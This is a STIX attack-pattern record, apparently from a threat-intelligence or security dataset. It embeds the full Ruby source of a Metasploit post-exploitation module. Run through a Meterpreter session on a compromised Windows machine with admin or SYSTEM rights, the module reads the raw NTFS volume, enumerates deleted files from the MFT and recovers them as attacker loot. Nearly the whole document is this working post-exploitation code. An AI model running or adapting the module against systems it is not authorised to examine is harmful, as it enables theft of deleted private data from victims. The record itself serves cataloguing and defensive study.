{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--d3f32eec-f89e-4d6e-9d20-bf9ffb32a762",
    "created": "2024-08-14T16:33:05.062877Z",
    "modified": "2024-08-14T16:33:05.062881Z",
    "name": "Windows Gather Deleted Files Enumeration and Recovering",
    "description": " This module lists and attempts to recover deleted files from NTFS file systems. Use the FILES option to guide recovery. Leave this option empty to enumerate deleted files in the DRIVE. Set FILES to an extension (e.g., \"pdf\") to recover deleted files with that extension, or set FILES to a comma separated list of IDs (from enumeration) to recover those files. The user must have account file enumeration. Recovery may take a long time; use the TIMEOUT option to abort enumeration or recovery by extension after a specified period (in seconds).  'License' => MSF_LICENSE 'Platform' => ['win'] 'SessionTypes' => ['meterpreter']",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/windows/gather/forensics/recovery_files.rb",
            "external_id": "recovery_files.rb"
        },
        {
            "source_name": "reference",
            "url": "https://www.youtube.com/watch?v=9yzCf360ujY&hd=1"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Post\n  include Msf::Post::Windows::Priv\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Windows Gather Deleted Files Enumeration and Recovering',\n        'Description' => %q{\n          This module lists and attempts to recover deleted files from NTFS file systems. Use\n          the FILES option to guide recovery. Leave this option empty to enumerate deleted files in the\n          DRIVE. Set FILES to an extension (e.g., \"pdf\") to recover deleted files with that\n          extension, or set FILES to a comma separated list of IDs (from enumeration) to\n          recover those files. The user must have account file enumeration. Recovery\n          may take a long time; use the TIMEOUT option to abort enumeration or recovery by\n          extension after a specified period (in seconds).\n        },\n        'License' => MSF_LICENSE,\n        'Platform' => ['win'],\n        'SessionTypes' => ['meterpreter'],\n        'Author' => ['Borja Merino <bmerinofe[at]gmail.com>'],\n        'References' => [\n          [ 'URL', 'https://www.youtube.com/watch?v=9yzCf360ujY&hd=1' ]\n        ],\n        'Compat' => {\n          'Meterpreter' => {\n            'Commands' => %w[\n              stdapi_railgun_api\n            ]\n          }\n        }\n      )\n    )\n    register_options(\n      [\n        OptString.new('FILES', [false, 'ID or extensions of the files to recover in a comma separated way. Let empty to enumerate deleted files.', '']),\n        OptString.new('DRIVE', [true, 'Drive you want to recover files from.', 'C:']),\n        OptInt.new('TIMEOUT', [true, 'Search timeout. If 0 the module will go through the entire $MFT.', 3600])\n      ]\n    )\n  end\n\n  def run\n    version = get_version_info\n    if version.build_number == Msf::WindowsVersion::Win2000\n      print_error('Module not valid for Windows 2000')\n      return\n    end\n\n    drive = datastore['DRIVE']\n    fs = file_system(drive)\n\n    if fs !~ /ntfs/i\n      print_error('The file system is not NTFS')\n      return\n    end\n\n    if !is_admin?\n      print_error(\"You don't have enough privileges. Try getsystem.\")\n      return\n    end\n\n    print_status(\"System Info - OS: #{version.product_name}, Drive: #{drive}\")\n    type = datastore['FILES']\n    files = type.split(',')\n    # To extract files from its IDs\n    if (datastore['FILES'] != '') && is_numeric(files[0])\n      r = client.railgun.kernel32.CreateFileA(\"\\\\\\\\.\\\\#{drive}\", 'GENERIC_READ', 'FILE_SHARE_DELETE|FILE_SHARE_READ|FILE_SHARE_WRITE', nil, 'OPEN_EXISTING', 'FILE_FLAG_WRITE_THROUGH', 0)\n      if r['GetLastError'] == 0\n        recover_file(files, r['return'])\n        client.railgun.kernel32.CloseHandle(r['return'])\n      else\n        print_error(\"Error opening #{drive} GetLastError=#{r['GetLastError']}\")\n      end\n    # To show deleted files (FILE=\"\") or extract the type of file specified by extension\n    else\n      handle = get_mft_info(drive)\n      if !handle.nil?\n        data_runs = mft_data_runs(handle)\n        vprint_status(\"It seems that MFT is fragmented (#{data_runs.size - 1} data runs)\") if (data_runs.count > 2)\n        to = datastore['TIMEOUT'].zero? ? nil : datastore['TIMEOUT']\n        begin\n          ::Timeout.timeout(to) do\n            deleted_files(data_runs[1..], handle, files)\n          end\n        rescue ::Timeout::Error\n          print_error(\"Timed out after #{to} seconds. Skipping...\")\n        end\n      end\n    end\n  end\n\n  def get_high_low_values(offset)\n    # Always positive values\n    return [offset, 0] if (offset < 0x1_0000_0000)\n\n    # Strange Case. The MFT datarun would have to be really far\n    return [offset & 0xffff_ffff, offset >> 32]\n  end\n\n  # Recover the content of the file/files requested\n  def recover_file(offset, handle)\n    file_system_features(handle)\n    # Offset could be in a comma separated list of IDs\n    0.upto(offset.size - 1) do |i|\n      val = get_high_low_values(offset[i].to_i)\n      client.railgun.kernel32.SetFilePointer(handle, val[0], val[1], 0)\n      rf = client.railgun.kernel32.ReadFile(handle, 1024, 1024, 4, nil)\n      attributes = rf['lpBuffer'][56..]\n      name = get_name(attributes)\n      print_status(\"File to download: #{name}\")\n      vprint_status('Getting Data Runs ...')\n      data = get_data_runs(attributes)\n      if data.nil? || name.nil?\n        print_error(\"There were problems to recover the file: #{name}\")\n        next\n      end\n\n      # If file is resident\n      if data[0] == 0\n        print_status(\"The file is resident. Saving #{name} ... \")\n        path = store_loot('resident.file', 'application/octet-stream', session, data[1], name.downcase, nil)\n\n      # If file no resident\n      else\n        # Due to the size of the non-resident files we have to store small chunks of data as we go through each of the data runs\n        # that make up the file (save_file function).\n        size = get_size(rf['lpBuffer'][56..])\n        print_status(\"The file is not resident. Saving #{name} ... (#{size} bytes)\")\n        base = 0\n        # Go through each of the data runs to save the file\n        file_data = ''\n        1.upto(data.count - 1) do |i|\n          datarun = get_datarun_location(data[i])\n          base += datarun[0]\n          size = save_file([base, datarun[1]], size, file_data, handle)\n        end\n        # file.close\n        path = store_loot('nonresident.file', 'application/octet-stream', session, file_data, name.downcase, nil)\n      end\n      print_good(\"File saved on #{path}\")\n    end\n  end\n\n  # Save the no resident file to disk\n  def save_file(datarun, size, file_data, handle)\n    ra = file_system_features(handle)\n    bytes_per_cluster = ra['lpOutBuffer'][44, 4].unpack('V*')[0]\n    distance = get_high_low_values(datarun[0] * bytes_per_cluster)\n    client.railgun.kernel32.SetFilePointer(handle, distance[0], distance[1], 0)\n    # Buffer chunks to store in disk. Modify this value as you wish.\n    buffer_size = 8\n    division = datarun[1] / buffer_size\n    rest = datarun[1] % buffer_size\n    vprint_status(\"Number of chunks: #{division}\tRest: #{rest} clusters\tChunk size: #{buffer_size} clusters \")\n    if (division > 0)\n      1.upto(division) do |_i|\n        rf = client.railgun.kernel32.ReadFile(handle, bytes_per_cluster * buffer_size, bytes_per_cluster * buffer_size, 4, nil)\n        if (size > bytes_per_cluster * buffer_size)\n          file_data << rf['lpBuffer']\n          size -= bytes_per_cluster * buffer_size\n          vprint_status(\"Save 1 chunk of #{buffer_size * bytes_per_cluster} bytes, there are #{size} left\")\n        # It's the last datarun\n        else\n          file_data << rf['lpBuffer'][0..size - 1]\n          vprint_status(\"Save 1 chunk of #{size} bytes\")\n        end\n      end\n    end\n\n    if (rest > 0)\n      # It's the last datarun\n      if (size < rest * bytes_per_cluster)\n        rf = client.railgun.kernel32.ReadFile(handle, rest * bytes_per_cluster, rest * bytes_per_cluster, 4, nil)\n        # Don't save the slack space\n        file_data << rf['lpBuffer'][0..size - 1]\n        vprint_status(\"(Last datarun) Save 1 chunk of #{size}\")\n      else\n        rf = client.railgun.kernel32.ReadFile(handle, bytes_per_cluster * rest, bytes_per_cluster * rest, 4, nil)\n        file_data << rf['lpBuffer']\n        size -= bytes_per_cluster * rest\n        vprint_status(\"(No last datarun) Save 1 chunk of #{rest * bytes_per_cluster}, there are #{size} left\")\n      end\n    end\n    return size\n  end\n\n  # Get the logical cluster and the offset of each datarun\n  def get_datarun_location(datarun)\n    n_log_cluster = datarun.each_byte.first.divmod(16)[0]\n    n_offset = datarun.each_byte.first.divmod(16)[1]\n\n    log_cluster = datarun[-n_log_cluster..]\n    offset = datarun[1..n_offset]\n\n    log_cluster << \"\\x00\" if log_cluster.size.odd?\n    offset << \"\\x00\" if offset.size.odd?\n    # The logical cluster value could be negative so we need to get the 2 complement in those cases\n    if log_cluster.size == 2\n      int_log_cluster = log_cluster.unpack('v*')[0]\n    elsif log_cluster.size == 4\n      int_log_cluster = log_cluster.unpack('V')[0]\n    end\n\n    if offset.size == 2\n      int_offset = offset.unpack('v*')[0]\n    else\n      int_offset = offset.unpack('V')[0]\n    end\n    return int_log_cluster, int_offset\n  end\n\n  # Go though the datarun and save the wanted files\n  def go_over_mft(logc, offset, handle, files)\n    dist = get_high_low_values(logc)\n    client.railgun.kernel32.SetFilePointer(handle, dist[0], dist[1], 0)\n    1.upto(offset) do |_i|\n      # If FILE header and deleted file (\\x00\\x00)\n      rf = client.railgun.kernel32.ReadFile(handle, 1024, 1024, 4, nil)\n      if (rf['lpBuffer'][0, 4] == \"\\x46\\x49\\x4c\\x45\") && (rf['lpBuffer'][22, 2] == \"\\x00\\x00\")\n        name = get_name(rf['lpBuffer'][56..])\n        if !name.nil?\n          print_status(\"Name: #{name}\tID: #{logc}\")\n          # If we want to save it according to the file extensions\n          if (files != '') && files.include?(File.extname(name.capitalize)[1..])\n            print_good('Hidden file found!')\n            recover_file([logc.to_s], handle)\n            dist = get_high_low_values(logc + 1024)\n            # We need to restore the pointer to the current MFT entry\n            client.railgun.kernel32.SetFilePointer(handle, dist[0], dist[1], 0)\n          end\n        end\n      # MFT entry with no FILE '\\x46\\x49\\x4c\\x45' header or its not a deleted file (dir, file, deleted dir)\n      else\n        logc += 1024\n        next\n\n      end\n      logc += 1024\n    end\n  end\n\n  # Recieve the MFT data runs and list/save the deleted files\n  # Useful cheat_sheet to understand the MFT structure:  http://www.writeblocked.org/resources/ntfs_cheat_sheets.pdf\n  # Recap of each of the attributes: http://runenordvik.com/doc/MFT-table.pdf\n  def deleted_files(data_runs, handle, files)\n    ra = file_system_features(handle)\n    bytes_per_cluster = ra['lpOutBuffer'][44, 4].unpack('V*')[0]\n    print_status(\"$MFT is made up of #{data_runs.size} dataruns\")\n    base = 0\n    real_loc = []\n    0.upto(data_runs.size - 1) do |i|\n      datar_info = get_datarun_location(data_runs[i])\n      base += datar_info[0]\n      vprint_status(\"MFT data run #{i + 1} is at byte #{base * bytes_per_cluster}. It has a total of #{datar_info[1]} clusters\")\n      # Add to the beginning\n      real_loc.unshift([base * bytes_per_cluster, (bytes_per_cluster * datar_info[1]) / 1024])\n    end\n\n    # We start for the last data run to show quiet sooner deleted files\n    0.upto(real_loc.size - 1) do |i|\n      print_status(\"Searching deleted files in data run #{data_runs.size - i} ... \")\n      go_over_mft(real_loc[i][0], real_loc[i][1], handle, files)\n    end\n\n    print_good('MFT entries finished')\n    client.railgun.kernel32.CloseHandle(handle)\n  end\n\n  def get_name(entry)\n    data_name = get_attribute(entry, \"\\x30\\x00\\x00\\x00\")\n    return nil if data_name.nil?\n\n    length = data_name[88, 1].unpack('H*')[0].to_i(16)\n    return data_name[90, length * 2].delete(\"\\000\")\n  end\n\n  def get_size(entry)\n    data = get_attribute(entry, \"\\x80\\x00\\x00\\x00\")\n    return if data.nil?\n\n    return data[48, 8].unpack('Q<*')[0]\n  end\n\n  # Gets the NTFS information and return a pointer to the beginning of the MFT\n  def get_mft_info(drive)\n    r = client.railgun.kernel32.CreateFileA(\"\\\\\\\\.\\\\#{drive}\", 'GENERIC_READ', 'FILE_SHARE_DELETE|FILE_SHARE_READ|FILE_SHARE_WRITE', nil, 'OPEN_EXISTING', 'FILE_FLAG_WRITE_THROUGH', 0)\n\n    if r['GetLastError'] != 0\n      print_error(\"Error opening #{drive} GetLastError=#{r['GetLastError']}\")\n      print_error('Try to get SYSTEM Privilege') if r['GetLastError'] == 5\n      return nil\n    else\n      ra = file_system_features(r['return'])\n      bytes_per_cluster = ra['lpOutBuffer'][44, 4].unpack('V*')[0]\n      mft_logical_offset = ra['lpOutBuffer'][64, 8].unpack('V*')[0]\n      offset_mft_bytes = mft_logical_offset * bytes_per_cluster\n      vprint_status(\"Logical cluster : #{ra['lpOutBuffer'][64, 8].unpack('h*')[0].reverse}\")\n      vprint_status(\"NTFS Volumen Serial Number: #{ra['lpOutBuffer'][0, 8].unpack('h*')[0].reverse}\")\n      vprint_status(\"Bytes per Sector: #{ra['lpOutBuffer'][40, 4].unpack('V*')[0]}\")\n      vprint_status(\"Bytes per Cluster: #{bytes_per_cluster}\")\n      vprint_status(\"Length of the MFT (bytes): #{ra['lpOutBuffer'][56, 8].unpack('Q<*')[0]}\")\n      vprint_status(\"Logical cluster where MTF starts #{mft_logical_offset}\")\n      # We set the pointer to the beginning of the MFT\n      client.railgun.kernel32.SetFilePointer(r['return'], offset_mft_bytes, 0, 0)\n      return r['return']\n    end\n  end\n\n  def file_system_features(handle)\n    fsctl_get_ntfs_volume_data = 0x00090064\n    return client.railgun.kernel32.DeviceIoControl(handle, fsctl_get_ntfs_volume_data, '', 0, 200, 200, 4, nil)\n  end\n\n  def mft_data_runs(handle)\n    # Read the first entry of the MFT (the $MFT itself)\n    rf = client.railgun.kernel32.ReadFile(handle, 1024, 1024, 4, nil)\n    # Return the list of data runs of the MFT\n    return get_data_runs(rf['lpBuffer'][56..])\n  end\n\n  # Receive a string pointing to the first attribute of certain file entry and returns an array of data runs\n  # of that file. The first element will be 1 or 0 depending on whether the attribute is resident or not. If it's resident\n  # the second element will be the content itself, otherwise (if not resident) each element will contain  each of\n  # the data runs of that file\n  def get_data_runs(data)\n    # We reach de DATA attribute\n    data_runs = get_attribute(data, \"\\x80\\x00\\x00\\x00\")\n    return nil if data_runs.nil?\n\n    print_status('File compressed/encrypted/sparse. Ignore this file if you get errors') if [\"\\x01\\x00\", \"\\x00\\x40\", \"\\x00\\x80\"].include? data_runs[12, 2]\n    # Check if the file is resident or not\n    resident = data_runs[8, 1]\n    if resident == \"\\x00\"\n      inf = [0]\n      inf << get_resident(data_runs)\n    else\n      inf = [1]\n      # Get the offset of the first data run from $DATA\n      dist_datar = data_runs[32, 2].unpack('v*')[0]\n      data_run = data_runs[dist_datar..]\n      # Get an array of data runs. If this array contains more than 1 element the file is fragmented.\n      lengh_dr = data_run.each_byte.first.divmod(16)\n      while (lengh_dr[0] != 0 && lengh_dr[1] != 0)\n        chunk = data_run[0, lengh_dr[0] + lengh_dr[1] + 1]\n        inf << chunk\n        data_run = data_run[lengh_dr[0] + lengh_dr[1] + 1..]\n        begin\n          lengh_dr = data_run.each_byte.first.divmod(16)\n        rescue StandardError\n          return nil\n        end\n      end\n    end\n    return inf\n  end\n\n  # Get the content of the file when it's resident\n  def get_resident(data)\n    start = data[20, 2].unpack('v*')[0]\n    offset = data[16, 4].unpack('V*')[0]\n    return data[start, offset]\n  end\n\n  # Find the attribute requested in the file entry and returns a string with all the information of that attribute\n  def get_attribute(str, code)\n    0.upto(15) do |_i|\n      header = str[0, 4]\n      size_att = str[4, 4].unpack('V*')[0]\n      if header == code\n        return str[0..size_att]\n      else\n        # To avoid not valid entries or the attribute doesn't not exist\n        return nil if (size_att > 1024) || (header == \"\\xff\\xff\\xff\\xff\")\n\n        str = str[size_att..]\n      end\n    end\n    print_status('Attribute not found')\n    return nil\n  end\n\n  # Get the type of file system\n  def file_system(drive)\n    # BOOL WINAPI GetVolumeInformation(\n    #  _In_opt_   LPCTSTR lpRootPathName,\n    #  _Out_opt_  LPTSTR lpVolumeNameBuffer,\n    #  _In_       DWORD nVolumeNameSize,\n    #  _Out_opt_  LPDWORD lpVolumeSerialNumber,\n    #  _Out_opt_  LPDWORD lpMaximumComponentLength,\n    #  _Out_opt_  LPDWORD lpFileSystemFlags,\n    #  _Out_opt_  LPTSTR lpFileSystemNameBuffer,\n    #  _In_       DWORD nFileSystemNameSize)\n    r = client.railgun.kernel32.GetVolumeInformationA(\"#{drive}//\", nil, nil, nil, nil, nil, 8, 8)\n    fs = r['lpFileSystemNameBuffer']\n    return fs\n  end\n\n  def is_numeric(o)\n    true if Integer(o)\n  rescue StandardError\n    false\n  end\nend\n"
}